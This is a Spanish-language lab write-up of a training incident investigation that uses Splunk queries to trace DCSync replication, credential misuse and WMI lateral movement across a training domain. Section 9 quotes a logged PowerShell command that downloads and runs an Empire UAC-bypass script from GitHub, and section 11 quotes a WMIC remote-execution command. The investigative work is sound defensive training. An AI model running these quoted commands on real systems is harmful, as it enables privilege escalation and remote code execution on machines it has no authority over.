Caso de laboratorio CDSA investigado con **Splunk SPL**. La correlación permite identificar actividad compatible con replicación abusiva; no demuestra extracción exitosa de hashes. Los hosts y cuentas pertenecen al entorno de entrenamiento.

Una captura seleccionada y revisada acompaña este caso. El análisis restante conserva las consultas y tablas del informe; las capturas no revisadas se han omitido.

## 1. Investigación inicial — Event ID 4662

**Objetivo:** Identificar las cuentas y los hosts que generan eventos de acceso al servicio de directorio, como primer filtro para actividad DCSync.

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4662
| stats count min(_time) as first_seen max(_time) as last_seen by ComputerName Account_Name
| convert ctime(first_seen) ctime(last_seen)
| sort -count
```

**Evidencia**

![Splunk: línea base del DC y 32 eventos de la cuenta management](/images/cases/splunk-replication-baseline.png)

**Análisis técnico**

Los 189 eventos se registraron en el controlador de dominio `WIN-HHSGPJM30S2.htbdefense.local`.

| Cuenta             | Eventos | Primera vez         | Última vez          |
| ------------------ | ------- | ------------------- | ------------------- |
| `WIN-HHSGPJM30S2$` | 154     | 2023-09-05 22:31:53 | 2023-09-13 18:45:59 |
| `management`       | 32      | 2023-09-11 18:50:56 | 2023-09-11 18:52:31 |
| `Administrator`    | 3       | 2023-09-11 17:53:31 | 2023-09-11 18:37:39 |

Los eventos de `WIN-HHSGPJM30S2$` abarcan nueve días (línea base de la cuenta de máquina del DC) y no se persiguieron. `management` generó 32 eventos en unos 95 segundos. El Event ID 4662 registra el acceso a objetos del directorio y a derechos extendidos, por lo que el recuento por sí solo no establece DCSync.

**Conclusión:** `management` es la cuenta de interés

---

## 2. Investigación de permisos DCSync

**Objetivo:** Determinar qué cuentas ejercieron `Control Access` (`0x100`) sobre objetos del directorio, y si `management` usó derechos extendidos coherentes con la replicación de Active Directory.

1. Control Access en todas las cuentas

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4662 Access_Mask=0x100
| stats count min(_time) as first_seen max(_time) as last_seen by ComputerName Account_Name
| convert ctime(first_seen) ctime(last_seen)
| sort -count
```

**Análisis técnico**

La búsqueda devolvió 184 eventos, todos en `WIN-HHSGPJM30S2`:

| Cuenta             | Eventos | Primera vez         | Última vez          |
| ------------------ | ------- | ------------------- | ------------------- |
| `WIN-HHSGPJM30S2$` | 152     | 2023-09-05 22:31:53 | 2023-09-13 18:45:59 |
| `management`       | 32      | 2023-09-11 18:50:56 | 2023-09-11 18:52:31 |

Los 3 eventos de `Administrator` no llevan `0x100`. Solo la cuenta de máquina del propio DC y `management` ejercieron `Control Access`.

**Conclusión:** `management` es la única cuenta que no es de máquina que ejerce `Control Access` en el controlador de dominio, por lo que el análisis continúa con ella.

2. Detalle de eventos de `management`

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4662 Account_Name="management"
| table _time ComputerName Account_Name Access_Mask Accesses Object_Name Object_Type Properties
| sort 0 _time
```

**Análisis técnico**

| Campo         | Resultado                                      | Interpretación                         |
| ------------- | ---------------------------------------------- | -------------------------------------- |
| Account       | `management`                                   | Cuenta bajo investigación              |
| Host          | `WIN-HHSGPJM30S2`                              | Controlador de dominio que registra los eventos |
| EventCode     | `4662`                                         | Acceso al servicio de directorio       |
| Access_Mask   | `0x100`                                        | Control Access (derecho extendido)     |
| Object_Type   | `{19195a5b-6da0-11d0-afd3-00c04fd930c9}`       | Clase `domainDNS` (el objeto de dominio) |
| Date          | 2023-09-11                                     | Ventana de actividad                   |

`Control Access` sobre el objeto de dominio es un requisito previo para los derechos de replicación, pero la columna `Properties` solo muestra la etiqueta genérica. El derecho específico aún no está identificado.

**Conclusión:** Sospechoso, aún sin confirmar como replicación

---

## 3. Inspección del evento en crudo

**Objetivo:** Inspeccionar un evento completo para identificar el GUID del derecho extendido detrás de `Control Access`.

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4662 Account_Name="management"
| head 1
| table _time _raw
```

**Análisis técnico**

El evento en crudo lista `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` en `Properties`, que es **DS-Replication-Get-Changes-All**, el derecho que permite la replicación de atributos secretos (hashes de contraseñas).

- **Cuenta:** `HTBDEFENSE\management`
- **Host:** `WIN-HHSGPJM30S2.htbdefense.local`
- **Marca de tiempo:** `2023-09-11 18:52:31`
- **Logon ID:** `0x3E62AF4`
- **Access Mask:** `0x100` (`Audit Success`)

**Conclusión:** Confirmado. Una cuenta de usuario que no es un DC ejerció un derecho de replicación sobre el objeto de dominio. Es un fuerte indicador de DCSync

## 4. Cuantificación de los derechos de replicación en los 32 eventos

**Objetivo:** Determinar cuántos de los 32 eventos llevan cada GUID relacionado con la replicación.

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4662 Account_Name="management"
| eval GetChanges=if(match(_raw,"(?i)1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"),1,0)
| eval GetChangesAll=if(match(_raw,"(?i)1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"),1,0)
| eval GetChangesFiltered=if(match(_raw,"(?i)89e95b76-444d-4c62-991a-0facbeda640c"),1,0)
| stats count as total_events sum(GetChanges) as get_changes sum(GetChangesAll) as get_changes_all sum(GetChangesFiltered) as filtered_set by Account_Name
```

**Análisis técnico**

| Derecho extendido                           | Eventos coincidentes |
| ------------------------------------------- | -------------------- |
| DS-Replication-Get-Changes                  | 16                   |
| DS-Replication-Get-Changes-All              | 8                    |
| DS-Replication-Get-Changes-In-Filtered-Set  | 8                    |

Los tres recuentos suman 32, coherente con que cada evento lleve uno de los tres derechos. Una solicitud DCSync ejerce estos derechos en combinación.

**Conclusión:** Confirmado. Los 32 eventos involucran derechos de replicación. Esto es coherente con DCSync, pero el 4662 por sí solo no muestra que los datos se replicaran realmente

---

## 5. Actividad de autenticación — Cuenta `management`

**Objetivo:** Identificar los sistemas y procesos que usaron las credenciales de `management` en torno a la actividad de replicación.

1. Identificación de eventos de autenticación

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security"
(EventCode=4768 OR EventCode=4769 OR EventCode=4776 OR EventCode=4648)
"management"
| stats count by EventCode ComputerName
| sort -count
```

**Análisis técnico**

La búsqueda analizó 32 eventos. Los eventos 4768, 4769 y 4776 ocurren en el controlador de dominio (tráfico de autenticación Kerberos/NTLM esperado). El Event ID 4648 (uso de credenciales explícitas) es la señal relevante y aparece en otros dos hosts: `DESKTOP-CFRVBBO.htbdefense.local` y `WIN-HIDUIPTH344.htbdefense.local`.

**Conclusión:** Dos sistemas candidatos para seguir analizando.

2. Uso de credenciales explícitas desde `DESKTOP-CFRVBBO`

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4648 "management"
| table _time ComputerName _raw
| sort 0 _time
```

**Análisis técnico**

| Campo              | Valor                                    |
| ------------------ | ---------------------------------------- |
| Marca de tiempo    | 2023-09-11 18:16:10                      |
| Host de origen     | `DESKTOP-CFRVBBO`                        |
| Cuenta iniciadora  | `HTBDEFENSE\sallym`                      |
| Credenciales usadas | `HTBDEFENSE\management`                 |
| Servidor destino   | `WIN-HHSGPJM30S2` (`10.0.0.249:445`)     |
| Servicio destino   | `cifs`                                   |
| Process ID         | `0x4` (sin nombre de proceso registrado) |

**Conclusión:** Confirmado. Una sesión de `sallym` suministró las credenciales de `management` contra el servicio de archivos compartidos del controlador de dominio.

3. Uso de credenciales explícitas desde `WIN-HIDUIPTH344`

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4648 ComputerName="WIN-HIDUIPTH344.htbdefense.local" "management"
| sort 0 _time
| head 1
| table _time _raw
```

**Análisis técnico**

| Campo               | Valor                                    |
| ------------------- | ---------------------------------------- |
| Marca de tiempo     | 2023-09-11 18:50:55                      |
| Host de origen      | `WIN-HIDUIPTH344`                        |
| Cuenta iniciadora   | `NT AUTHORITY\SYSTEM`                    |
| Proceso             | `powershell.exe` — PID `4544` (`0x11c0`) |
| Credenciales usadas | `HTBDEFENSE\management`                  |
| Servidor destino    | `WIN-HHSGPJM30S2`                        |
| Servicio destino    | `ldap`                                   |

Este evento ocurrió **un segundo antes** del primer evento 4662 relacionado con replicación (18:50:56).

**Conclusión:** Sospechoso, con un fuerte vínculo temporal. `WIN-HIDUIPTH344` es un fuerte candidato a sistema de origen.

---

## 6. Investigación del proceso PowerShell e IP de origen

**Objetivo:** Investigar el PowerShell PID `4544` del `WIN-HIDUIPTH344`, identificar su IP de origen y examinar su actividad de red.

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=3 ComputerName="WIN-HIDUIPTH344.htbdefense.local" ProcessId=4544 Image="*powershell.exe"
| table _time Image ProcessId SourceIp SourcePort DestinationIp DestinationPort DestinationHostname Initiated
```

**Análisis técnico**

| Campo                  | Valor                            |
| ---------------------- | -------------------------------- |
| Marca de tiempo        | 2023-09-11 18:50:48              |
| Proceso                | `powershell.exe` — PID `4544`    |
| IP / Puerto de origen  | `10.0.0.216` / `51605`           |
| IP / Puerto de destino | `185.199.111.133` / `443`        |
| Hostname de destino    | `cdn-185-199-111-133.github.com` |
| Initiated              | `true`                           |

PowerShell inició una conexión HTTPS saliente a un host que resuelve a infraestructura de GitHub, siete segundos antes del evento 4648 del `WIN-HIDUIPTH344`. 

**Conclusión:** Confirmado: `10.0.0.216` es la IP de origen de la conexión de PowerShell. Sospechoso: la conexión a GitHub que precede al uso de credenciales.

- [ ] Comunicación con el controlador de dominio

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=3
ComputerName="WIN-HIDUIPTH344.htbdefense.local"
SourceIp="10.0.0.216" DestinationIp="10.0.0.249"
| table _time Image ProcessId SourceIp DestinationIp DestinationPort Initiated
| sort 0 _time
```

**Análisis técnico**

La búsqueda devolvió 4,153 eventos Sysmon ID 3 que abarcan varios días (desde 2023-09-05). Las filas mostradas pertenecen a procesos del sistema (`lsass.exe`, `svchost.exe`, `taskhostw.exe`) en los puertos 53, 88 y 389. Es tráfico de línea base entre el host y el DC

**Conclusión:** La conectividad entre `10.0.0.216` y `10.0.0.249` está confirmada.

---

## 7. Investigación del origen de DCSync — Correlación de red

**Objetivo:** Identificar el posible sistema de origen de DCSync correlacionando las conexiones de red con los eventos de replicación 4662 del controlador de dominio.

- [ ] Consulta SPL

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=3
ComputerName="WIN-HIDUIPTH344.htbdefense.local"
SourceIp="10.0.0.216" DestinationIp="10.0.0.249"
| eval timestamp=strftime(_time,"%Y-%m-%d %H:%M:%S")
| where timestamp>="2023-09-11 18:50:40" AND timestamp<="2023-09-11 18:53:00"
| stats count min(timestamp) as first_seen max(timestamp) as last_seen by Image ProcessId DestinationPort Initiated
| sort -count
```

La consulta devuelve **25 eventos Sysmon ID 3**, agrupados en 11 resultados.

El PID `4544`, registrado como `<unknown process>`, generó cinco conexiones hacia el controlador de dominio:

|Puerto|Conexiones|Hora (2023-09-11)|
|---|---|---|
|389 — LDAP|3|18:50:56–18:50:57|
|135 — RPC Endpoint Mapper|1|18:50:57|
|49667 — RPC dinámico|1|18:50:57|

- [ ] Análisis técnico

La actividad de red coincide temporalmente con dos hallazgos anteriores:

|Hora|Evento|Hallazgo|
|---|---|---|
|18:50:55|Security 4648|Uso explícito de credenciales `HTBDEFENSE\management` desde `WIN-HIDUIPTH344`|
|18:50:56|Sysmon 3|Inicio de conexiones LDAP/RPC desde `10.0.0.216` hacia `10.0.0.249`|
|18:50:56–18:52:31|Security 4662|Accesos al objeto de dominio con derechos de replicación|

El PID `4544` coincide con el proceso PowerShell identificado previamente en el evento 4648 y en la actividad de red anterior. Sin embargo, los eventos aquí agrupados no permiten confirmar su identidad mediante `ProcessGuid`.

- [ ] Conclusión

|Elemento|Resultado|
|---|---|
|Origen probable|`WIN-HIDUIPTH344.htbdefense.local`|
|IP de origen|`10.0.0.216`|
|Destino|`WIN-HHSGPJM30S2.htbdefense.local`|
|IP de destino|`10.0.0.249`|
|Cuenta asociada|`HTBDEFENSE\management`|
|Confianza|Alta para la identificación del origen probable|

**Confirmado:** comunicaciones LDAP/RPC desde el sistema sospechoso durante la ventana de accesos a derechos de replicación.
**Resultado:** objetivo de correlación de red cumplido. `WIN-HIDUIPTH344` se identifica como el origen probable de la actividad DCSync investigada.

---
## 8. Ejecución sospechosa

**Objetivo:** Identificar un ejecutable sospechoso sin conocer previamente su nombre, y luego establecer dónde y bajo qué cuenta se ejecutó.

1. Descubrimiento de procesos — Sysmon Event ID 1

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| stats count by Image
| sort -count
```

**Análisis técnico:** 246,663 eventos de creación de procesos corresponden a 280 rutas de ejecutables distintas. Esto da una línea base desde la cual buscar ubicaciones inusuales.

2. Ejecutables en ubicaciones escribibles por el usuario

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| stats count by Image
| where match(Image,"(?i)\\\\(Downloads|AppData|ProgramData)\\\\")
| sort -count
```

**Análisis técnico:** El filtro reduce la lista a 49 rutas, en su mayoría componentes de OneDrive/Defender. `C:\ProgramData\Analytics.exe` destaca. Un binario de herramienta en `ProgramData` es inusual, pero la ruta por sí sola no es prueba de comportamiento malicioso.

3. Ejecución de `C:\ProgramData\Analytics.exe`

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where Image="C:\\ProgramData\\Analytics.exe"
| table _time host User Image ProcessId CommandLine ParentImage ParentCommandLine
| sort 0 _time
```

**Análisis técnico**

Tres eventos de creación de procesos en `WIN-HIDUIPTH344`:

| Marca de tiempo     | Cuenta   | PID  | Proceso padre  |
| ------------------- | -------- | ---- | -------------- |
| 2023-09-11 18:32:36 | `management` | 2656 | `WmiPrvSE.exe` (`-secured -Embedding`) |
| 2023-09-13 17:49:03 | `SYSTEM` | 1096 | `services.exe` |
| 2023-09-13 17:50:38 | `SYSTEM` | 4944 | `services.exe` |

La ejecución bajo `management` ocurrió unos 18 minutos antes de la actividad 4662 (18:50:56).

4. Proceso padre y sesión de inicio de sesión

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where Image="C:\\ProgramData\\Analytics.exe"
| table _time host User ProcessId ProcessGuid ParentProcessId ParentImage ParentCommandLine LogonId
| sort 0 _time
```

**Análisis técnico**

La primera ejecución (PID `2656`) fue iniciada por `WmiPrvSE.exe` (PID `4248`) bajo `HTBDEFENSE\management`, Logon ID `0x28E0D1D`. Esta relación padre-hijo es coherente con la ejecución remota mediante WMI. Las dos ejecuciones posteriores se ejecutaron como `NT AUTHORITY\SYSTEM` (Logon ID `0x3E7`) desde `services.exe`, lo que sugiere un lanzamiento basado en servicios; el mecanismo no se verificó.

**Conclusión:** Sospechoso. `Analytics.exe` se ejecutó en `WIN-HIDUIPTH344` bajo `management` mediante WMI unos 18 minutos antes de la actividad de replicación

---

## 9. PowerShell e intento de bypass de UAC

**Objetivo:** Analizar una ejecución sospechosa de PowerShell iniciada por `RuntimeBroker.exe`, identificar su propósito y comprobar si existen evidencias de elevación de privilegios.

1. Relaciones padre–hijo

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where like(lower(ParentImage), "%runtimebroker.exe")
| stats count by host ParentImage Image
| sort -count
```

**Análisis técnico**

La consulta devuelve nueve eventos agrupados en siete combinaciones de procesos.

En `DESKTOP-CFRVBBO`, `RuntimeBroker.exe` aparece como proceso padre de varios ejecutables, entre ellos:

- `notepad.exe`
- `verclsid.exe`
- `LocalBridge.exe`
- `powershell.exe`
- `rundll32.exe`

`RuntimeBroker.exe` es un componente legítimo de Windows. Sin embargo, su relación como padre de PowerShell resulta inusual y justifica revisar la línea de comandos del proceso hijo.

2. Identificación del comando sospechoso

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where like(lower(ParentImage), "%runtimebroker.exe") AND like(lower(Image), "%powershell.exe")
| table _time host User Image ProcessId CommandLine ParentImage ParentProcessId ParentCommandLine
| sort 0 _time
```

**Análisis técnico**

|Campo|Resultado|
|---|---|
|Timestamp|`2023-09-11 18:08:41`|
|Host|`DESKTOP-CFRVBBO`|
|Usuario|`HTBDEFENSE\sallym`|
|Proceso|`powershell.exe`|
|PID|`3912`|
|Padre|`RuntimeBroker.exe`|
|Script referenciado|`Invoke-BypassUAC.ps1`|

**Línea de comandos identificada:**

```text
-C IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'
```

El comando contiene tres operaciones:

1. `DownloadString`: intenta recuperar un script remoto desde el repositorio EmpireProject.
2. `IEX`: intenta ejecutar el contenido descargado directamente en memoria.
3. `Invoke-BypassUAC`: invoca una función destinada a eludir UAC e iniciar otra instancia de PowerShell.

La ejecución ocurre **7 minutos y 29 segundos antes** del primer evento 4648 identificado para el uso explícito de credenciales de `management` (18:16:10).

**Conclusión:** Confirmado el lanzamiento de PowerShell con una línea de comandos orientada a intentar un bypass de UAC. 

3. Comprobación del nivel de integridad

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where like(lower(Image), "%\\powershell.exe")
| where _time>=strptime("2023-09-11 18:08:00","%Y-%m-%d %H:%M:%S") AND _time<=strptime("2023-09-11 18:12:00","%Y-%m-%d %H:%M:%S")
| table _time host User ProcessId ParentProcessId ParentImage CommandLine IntegrityLevel
| sort 0 _time
```

**Análisis técnico**

|Campo|Resultado|
|---|---|
|Host|`DESKTOP-CFRVBBO`|
|Usuario|`HTBDEFENSE\sallym`|
|Proceso|`powershell.exe`|
|PID|`3912`|
|Padre|`RuntimeBroker.exe` (PID `7100`)|
|IntegrityLevel|`Medium`|

La búsqueda identifica únicamente una creación de PowerShell durante la ventana examinada (18:08–18:12). El proceso presenta un nivel de integridad `Medium`, correspondiente a una ejecución sin elevación administrativa de alta integridad. No se identificaron nuevas instancias de PowerShell con nivel `High` o `System` durante esa ventana. 

**Conclusión** 

La evidencia confirma la ejecución de un comando orientado a evadir UAC, pero no demuestra una elevación exitosa de privilegios.

| Hallazgo                               | Evaluación    |
| -------------------------------------- | ------------- |
| `RuntimeBroker.exe` → `powershell.exe` | Confirmado    |
| Comando con `Invoke-BypassUAC`         | Confirmado    |
| PowerShell con integridad `Medium`     | Confirmado    |
| Descarga exitosa del script            | No demostrado |
| Ejecución exitosa del bypass           | No demostrado |
| Elevación a `High` o `System`          | No demostrada |

El 11 de septiembre de 2023 a las 18:08:41, se registró en `DESKTOP-CFRVBBO` una ejecución de PowerShell bajo `HTBDEFENSE\sallym` cuya línea de comandos intentaba obtener y ejecutar `Invoke-BypassUAC.ps1`. El hallazgo es compatible con un intento de evasión de mecanismos de elevación de privilegios (MITRE ATT&CK T1548.002).

## 10. Sesiones NewCredentials de `management` — Posible Pass-the-Hash

**Objetivo:** Identificar inicios de sesión `NewCredentials` (Logon Type 9), determinar su relación con `Analytics.exe` y evaluar si existe evidencia suficiente para confirmar Pass-the-Hash.

1. Identificación de sesiones NewCredentials

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4624
| where Logon_Type=9 AND lower(Logon_Process)="seclogo"
| stats count min(_time) as first_seen max(_time) as last_seen by ComputerName Account_Name
| convert ctime(first_seen) ctime(last_seen)
| sort -count
```

**Análisis técnico**

Se identificaron 15 eventos de autenticación `Logon Type 9` con `Logon Process = seclogo`.

|Cuenta|Host|Eventos|
|---|---|---|
|`SYSTEM` / `WIN-HIDUIPTH344$`|`WIN-HIDUIPTH344`|10|
|`sallym`|`DESKTOP-CFRVBBO`|3|
|`management`|`WIN-HIDUIPTH344`|2|

`Account_Name` contiene valores múltiples correspondientes al sujeto y a la nueva sesión. Por tanto, los recuentos mostrados por Splunk no deben sumarse directamente como eventos independientes.

2. Correlación de `management` con `Analytics.exe`

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security" EventCode=4624 Logon_Type=9
| where mvfind(Account_Name,"management")>=0
| table _time ComputerName Account_Name Logon_Process _raw
| sort 0 _time
```

**Análisis técnico**

Dos eventos examinados en `WIN-HIDUIPTH344` presentan la siguiente información:

|Campo|Sesión 1|Sesión 2|
|---|---|---|
|Timestamp|18:41:36|18:42:11|
|Cuenta|`management`|`management`|
|Logon Type|`9`|`9`|
|Logon Process|`Advapi`|`seclogo`|
|Subject Logon ID|`0x28E0D1D`|`0x28E0D1D`|
|New Logon ID|`0x28F1D17`|`0x28F2EA1`|
|Creator Process ID|`0xa60` (2656)|`0x31c` (796)|

Ambos eventos comparten el **Subject Logon ID** `0x28E0D1D`, identificado anteriormente en la ejecución de `C:\ProgramData\Analytics.exe` bajo `HTBDEFENSE\management`. El proceso creador del primer evento, PID `2656`, coincide con `Analytics.exe`, ejecutado mediante WMI a las 18:32:36. El segundo evento fue creado por `svchost.exe`, pero pertenece a la misma sesión de origen. 

**Conclusión:** Existe una correlación sólida entre la ejecución de `Analytics.exe` y la creación de sesiones `NewCredentials` de `management`. El mecanismo exacto de autenticación y el posible uso de hashes NTLM no están demostrados.

3. Privilegios y duración de la sesión

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:security"
| where match(_raw,"(?i)28F2EA1")
| stats count by EventCode ComputerName
| sort -count
```

**Detalle de privilegios — Event ID 4672**

**Detalle de cierre de sesión — Event ID 4634**

**Análisis técnico**

El identificador `0x28F2EA1` permite correlacionar tres eventos de seguridad:

|Hora (2023-09-11)|Event ID|Descripción|
|---|---|---|
|18:42:11|4624|Inicio de sesión NewCredentials|
|18:42:11|4672|Asignación de privilegios especiales|
|18:42:16|4634|Cierre de sesión|

El evento 4672 registra, entre otros, los siguientes privilegios:

- `SeDebugPrivilege`
- `SeImpersonatePrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeTakeOwnershipPrivilege`
- `SeLoadDriverPrivilege`
- `SeSecurityPrivilege`

### Conclusión

|Hallazgo|Estado|
|---|---|
|Sesiones NewCredentials de `management`|Confirmado|
|Relación de una sesión con `Analytics.exe` (PID 2656)|Confirmado|
|Privilegios especiales asignados|Confirmado|
|Cierre de la sesión `0x28F2EA1`|Confirmado|
|Uso de hashes NTLM mediante Pass-the-Hash|No demostrado|
|Participación de estas sesiones en DCSync|No demostrada|

La investigación identifica actividad sospechosa de autenticación en `WIN-HIDUIPTH344`, vinculada a la ejecución previa de `Analytics.exe`. La creación de sesiones `NewCredentials`, su origen común y la asignación de privilegios justifican mantener estos eventos como indicadores relevantes dentro de la investigación. Sin embargo, no existe evidencia suficiente para confirmar Pass-the-Hash ni para atribuir la posterior actividad DCSync a estas sesiones específicas.

---
## 11. Analytics.exe — Ejecución remota, correlación de hashes y comunicaciones de red

**Objetivo:** Investigar la presencia de `Analytics.exe` en distintos sistemas, verificar si corresponde al mismo ejecutable, identificar posibles técnicas de movimiento lateral y analizar sus comunicaciones de red.

1. Identificación de ejecuciones y procesos asociados

**Consulta SPL**

```spl
index="windows" sourcetype="wineventlog:sysmon" "analytics.exe" EventCode=1
| table _time host User Image ProcessId CommandLine ParentImage ParentCommandLine
| sort 0 _time
```

**Análisis técnico**

Los eventos Sysmon ID 1 identifican ejecuciones de `Analytics.exe` en tres sistemas:

|Fecha y hora (2023)|Host|Usuario|Ejecutable|
|---|---|---|---|
|09-10 20:05:27|`DESKTOP-762OF3B`|`john`|`E:\analytics.exe`|
|09-10 21:07:19|`DESKTOP-CFRVBBO`|`sallym`|`E:\analytics.exe`|
|09-10 21:08:15|`DESKTOP-CFRVBBO`|`sallym`|`E:\analytics.exe`|
|09-10 21:09:01|`DESKTOP-CFRVBBO`|`sallym`|`Downloads\analytics.exe`|
|09-11 12:12:03|`DESKTOP-CFRVBBO`|`sallym`|`Downloads\analytics.exe`|
|09-11 18:32:36|`WIN-HIDUIPTH344`|`management`|`C:\ProgramData\Analytics.exe`|

En `DESKTOP-762OF3B`, `Analytics.exe` también generó procesos hijos:

- `cmd.exe /c dir` — 20:13:28.
- `notepad.exe` — tres ejecuciones entre 20:50:32 y 20:52:15.

Estos registros son procesos hijos, no ejecuciones adicionales de `Analytics.exe`.

**Conclusión:** Confirmada la presencia y ejecución del binario en tres hosts bajo diferentes cuentas. Su distribución y propósito todavía no están establecidos.

2. Verificación de hashes

**Consulta SPL — Estaciones de trabajo**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1 "analytics.exe"
| table _time host User Image ParentImage Hashes
| sort 0 _time
```

**Consulta SPL — Servidor WIN-HIDUIPTH344**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=1
| where lower(Image)="c:\\programdata\\analytics.exe"
| table _time host User Image Hashes
| sort 0 _time
```

**Análisis técnico**

Los hashes MD5 registrados por Sysmon coinciden en las cuatro ubicaciones examinadas:

|Host|Ruta|MD5 coincide|
|---|---|---|
|`DESKTOP-762OF3B`|`E:\analytics.exe`|Sí|
|`DESKTOP-CFRVBBO`|`E:\analytics.exe`|Sí|
|`DESKTOP-CFRVBBO`|`C:\Users\sallym\Downloads\analytics.exe`|Sí|
|`WIN-HIDUIPTH344`|`C:\ProgramData\Analytics.exe`|Sí|

**MD5 registrado:**

```text
3452635A588A37CAF990F5D3267ACED0
```

En `WIN-HIDUIPTH344` también se registraron dos ejecuciones posteriores bajo `SYSTEM`, el 2023-09-13 a las 17:49:03 y 17:50:38, con el mismo hash.

**Conclusión:** Confirmada la coincidencia del MD5 de `Analytics.exe` entre los tres sistemas. No se ha demostrado cómo se transfirió el archivo entre ellos.

3. Ejecución remota mediante WMI

**Consulta SPL**

Se utiliza la consulta del apartado 11.1 para correlacionar el comando de ejecución remota con la creación del proceso en el sistema destino.

**Análisis técnico**

El 11 de septiembre de 2023 se identifica la siguiente secuencia:

|Hora|Host|Actividad|
|---|---|---|
|18:32:35|`DESKTOP-CFRVBBO`|`sallym` ejecuta `WMIC.exe`|
|18:32:36|`WIN-HIDUIPTH344`|Se inicia `Analytics.exe` bajo `management`|

**Comando identificado:**

```text
WMIC.exe /node:10.0.0.216 process call create C:\ProgramData\Analytics.exe
```

En el sistema destino:

|Campo|Resultado|
|---|---|
|Host|`WIN-HIDUIPTH344`|
|IP|`10.0.0.216`|
|Usuario|`HTBDEFENSE\management`|
|Proceso|`C:\ProgramData\Analytics.exe`|
|PID|`2656`|
|Proceso padre|`WmiPrvSE.exe`|
|Timestamp|`2023-09-11 18:32:36`|

La coincidencia entre el comando `WMIC.exe`, la dirección del sistema destino, la creación del proceso un segundo después y su relación con `WmiPrvSE.exe` confirma una ejecución remota mediante WMI. El proceso `WMIC.exe` aparece iniciado por `notepad.exe`; el origen de este proceso padre no fue investigado.

**Conclusión:** Ejecución remota mediante WMI confirmada, compatible con la técnica MITRE ATT&CK **T1047 — Windows Management Instrumentation**. El hallazgo respalda una posible actividad de movimiento lateral desde `DESKTOP-CFRVBBO` hacia `WIN-HIDUIPTH344`

4. Comunicaciones de red de Analytics.exe

**Consulta SPL — Destinos de red**

```spl
index="windows" sourcetype="wineventlog:sysmon" EventCode=3 Image="*analytics.exe"
| stats count min(_time) as first_seen max(_time) as last_seen by host DestinationIp DestinationPort
| convert ctime(first_seen) ctime(last_seen)
| sort -count
```

**Análisis técnico**

Se identificaron 15.489 eventos Sysmon ID 3, de los cuales 15.471 corresponden a conexiones hacia un mismo destino:

|Host|Destino|Puerto|Eventos|
|---|---|---|---|
|`DESKTOP-762OF3B`|`10.0.0.142`|80|6.120|
|`DESKTOP-CFRVBBO`|`10.0.0.142`|80|4.841|
|`WIN-HIDUIPTH344`|`10.0.0.142`|80|4.510|

Las primeras conexiones ocurren entre uno y dos segundos después de la primera ejecución del binario en cada sistema. También se observaron conexiones desde `Analytics.exe` hacia el controlador de dominio `10.0.0.249` mediante LDAP (389), SMB (445) y Global Catalog (3268), principalmente desde `DESKTOP-CFRVBBO`. El volumen de conexiones y su sincronización con las ejecuciones justifican investigar el destino `10.0.0.142`.

Consulta SPL — Identificación de otros sistemas que contactan al destino

```spl
index="windows" "10.0.0.142"
| stats count by host sourcetype SourceIp DestinationIp
```

**Análisis técnico**

La búsqueda devuelve 29.001 eventos que mencionan `10.0.0.142`, correspondientes a conexiones observadas desde varios sistemas:

|Host|IP de origen|
|---|---|
|`DESKTOP-762OF3B`|`10.0.0.224`|
|`DESKTOP-CFRVBBO`|`10.0.0.244`|
|`WIN-HIDUIPTH344`|`10.0.0.216`|
|`WIN-HHSGPJM30S2`|`10.0.0.249`|
|`WIN-HHSGPJM30S2`|`10.0.0.255`|

El controlador de dominio también contacta a esta dirección. No existen registros propios de `10.0.0.142` en la evidencia examinada, por lo que no se puede establecer su función ni identificar el contenido de las comunicaciones HTTP.

**Conclusión:** Confirmadas las comunicaciones repetidas desde `Analytics.exe` hacia `10.0.0.142:80`.

### Conclusión general

|Hallazgo|Evaluación|
|---|---|
|Ejecución de `Analytics.exe` en tres hosts|Confirmado|
|Coincidencia del MD5 entre las copias|Confirmado|
|Ejecución remota mediante WMI|Confirmado|
|Conexiones repetidas hacia `10.0.0.142:80`|Confirmado|
|Movimiento lateral no autorizado|Sospechoso|
|`10.0.0.142` como infraestructura C2|No demostrado|
|Transferencia del binario entre los hosts|No demostrado|
|Relación causal directa con DCSync|No demostrada|

La investigación demuestra que el mismo ejecutable `Analytics.exe` estuvo presente en tres sistemas y que fue iniciado remotamente desde `DESKTOP-CFRVBBO` hacia `WIN-HIDUIPTH344` mediante WMI.

Posteriormente, en `WIN-HIDUIPTH344`, se identificó actividad relacionada con el uso de credenciales de `management` y comunicaciones LDAP/RPC coincidentes con los eventos de replicación del controlador de dominio.

